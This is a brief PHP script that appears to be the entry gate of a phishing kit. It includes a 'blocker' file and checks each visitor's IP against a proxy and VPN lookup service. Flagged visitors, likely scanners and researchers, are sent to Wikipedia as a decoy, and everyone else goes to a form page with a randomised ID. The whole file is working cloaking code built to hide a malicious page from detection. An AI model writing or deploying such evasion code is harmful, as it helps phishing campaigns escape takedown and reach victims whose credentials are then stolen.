<?php
session_start();

include'blocker.php';
include'function.php'; 

$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => "https://blackbox.ipinfo.app/lookup/".$_SESSION['ip']."",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "GET",
  CURLOPT_HTTPHEADER => array(
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
  ),
));

$response = curl_exec($curl);
curl_close($curl);

if($response == "Y") {
    header("Location: https://www.wikipedia.org/");
}
else {
    
    header("Location: a?form_id=".getName($n)."");
}
				

 

?>